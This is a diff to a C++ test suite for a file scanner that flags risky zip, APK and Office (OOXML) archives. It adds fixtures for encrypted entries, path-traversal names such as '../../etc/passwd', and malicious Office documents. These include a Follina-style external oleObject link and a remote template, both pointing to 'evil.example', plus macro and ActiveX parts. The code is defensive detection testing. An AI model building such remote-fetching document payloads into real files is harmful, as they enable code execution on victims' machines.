@@ -189,13 +189,19 @@ int main() {
         std::string j;
         auto r = Scan(z, &j);
         assert(!r.flagged);
-        assert(j == "{\"file_type\":\"zip\",\"zip_entries\":2}");
+        assert(j == "{\"file_type\":\"zip\",\"zip_entries\":2,\"zip_encrypted_entries\":0,\"zip_uncompressed_total\":13,\"zip_flag_count\":0}");
     }
     assert(Has(Scan(BuildZip({{"../../etc/passwd", Bytes("x")}})), "path traversal"));
     assert(Has(Scan(BuildZip({{"a/..\\b", Bytes("x")}})), "path traversal"));
     assert(Has(Scan(BuildZip({{"/abs", Bytes("x")}})), "path traversal"));
     assert(!Scan(BuildZip({{"a/..b/c", Bytes("x")}})).flagged);
     assert(Has(Scan(BuildZip({{"a", Bytes("1")}, {"a", Bytes("2")}})), "duplicate"));
+    {
+        auto z = BuildZip({{"secret.txt", Bytes("xxxx")}});
+        size_t cd = z.size() - 22 - (46 + 10);
+        z[cd + 8] |= 0x01;
+        assert(Has(Scan(z), "is encrypted"));
+    }
     assert(Has(Scan(BuildZip({{"a", Bytes("1"), false, 0, "b"}})), "names differ"));
     {
         ZipOpts o;
@@ -245,8 +251,10 @@ int main() {
         auto r = Scan(BuildApk({}), &j);
         if (r.flagged) fprintf(stderr, "%s\n", r.reason.c_str());
         assert(!r.flagged);
-        assert(j == "{\"file_type\":\"apk\",\"zip_entries\":2,\"apk_signing\":\"v2\","
-                    "\"permission_strings\":1,\"high_risk_permissions\":0}");
+        assert(j == "{\"file_type\":\"apk\",\"zip_entries\":2,\"zip_encrypted_entries\":0,"
+                    "\"zip_uncompressed_total\":8404,\"zip_flag_count\":0,\"apk_signing\":\"v2\","
+                    "\"permission_strings\":1,\"high_risk_permissions\":0,\"dex_version\":\"035\","
+                    "\"dex_entropy\":3.500}");
     }
     {
         ApkOpts a;
@@ -309,6 +317,48 @@ int main() {
     {
         std::vector<TestEntry> es = {{"AndroidManifest.xml", Bytes("<manifest/>"), true}};
         assert(Has(Scan(BuildZip(es)), "not valid binary XML"));
+    }
+
+    {
+        auto rel = [](const std::string& type, const std::string& target) {
+            return "<?xml version=\"1.0\"?><Relationships><Relationship Id=\"rId1\" Type=\""
+                   "http://schemas.openxmlformats.org/officeDocument/2006/relationships/" + type +
+                   "\" Target=\"" + target + "\" TargetMode=\"External\"/></Relationships>";
+        };
+        std::vector<TestEntry> base = {{"[Content_Types].xml", Bytes("<Types/>"), true},
+                                       {"word/document.xml", Bytes("<w:document/>"), true}};
+        std::string j;
+        auto clean = base;
+        clean.push_back({"word/_rels/document.xml.rels", Bytes(rel("hyperlink", "https://example.com")), true});
+        auto r = Scan(BuildZip(clean), &j);
+        assert(!r.flagged);
+        assert(j == "{\"file_type\":\"ooxml\",\"zip_entries\":3,\"zip_encrypted_entries\":0,"
+                    "\"zip_uncompressed_total\":" + std::to_string(8 + 13 + clean[2].data.size()) +
+                    ",\"zip_flag_count\":0,\"ooxml_macros\":false,"
+                    "\"ooxml_activex\":0,\"ooxml_embeddings\":0,\"ooxml_external_rels\":1}");
+
+        auto follina = base;
+        follina.push_back({"word/_rels/document.xml.rels",
+                           Bytes(rel("oleObject", "http://evil.example/x.html!")), true});
+        assert(Has(Scan(BuildZip(follina)), "external oleObject from \"http://evil.example/x.html!\""));
+
+        auto tmpl = base;
+        tmpl.push_back({"word/_rels/settings.xml.rels", Bytes(rel("attachedTemplate", "http://evil.example/t.dotm")), false});
+        assert(Has(Scan(BuildZip(tmpl)), "external attachedTemplate"));
+
+        auto macro = base;
+        macro.push_back({"word/vbaProject.bin", Bytes("\xD0\xCF\x11\xE0"), true});
+        assert(Has(Scan(BuildZip(macro), &j), "VBA macros"));
+        assert(j.find("\"ooxml_macros\":true") != std::string::npos);
+
+        auto activex = base;
+        activex.push_back({"word/activeX/activeX1.bin", Bytes("x"), true});
+        assert(Has(Scan(BuildZip(activex)), "ActiveX"));
+
+        auto apk_like = base;
+        apk_like.push_back({"AndroidManifest.xml", Bytes("<manifest/>"), true});
+        assert(Has(Scan(BuildZip(apk_like), &j), "not valid binary XML"));
+        assert(j.find("\"file_type\":\"apk\"") != std::string::npos);
     }
 
     printf("zip_scan_test: all passed\n");
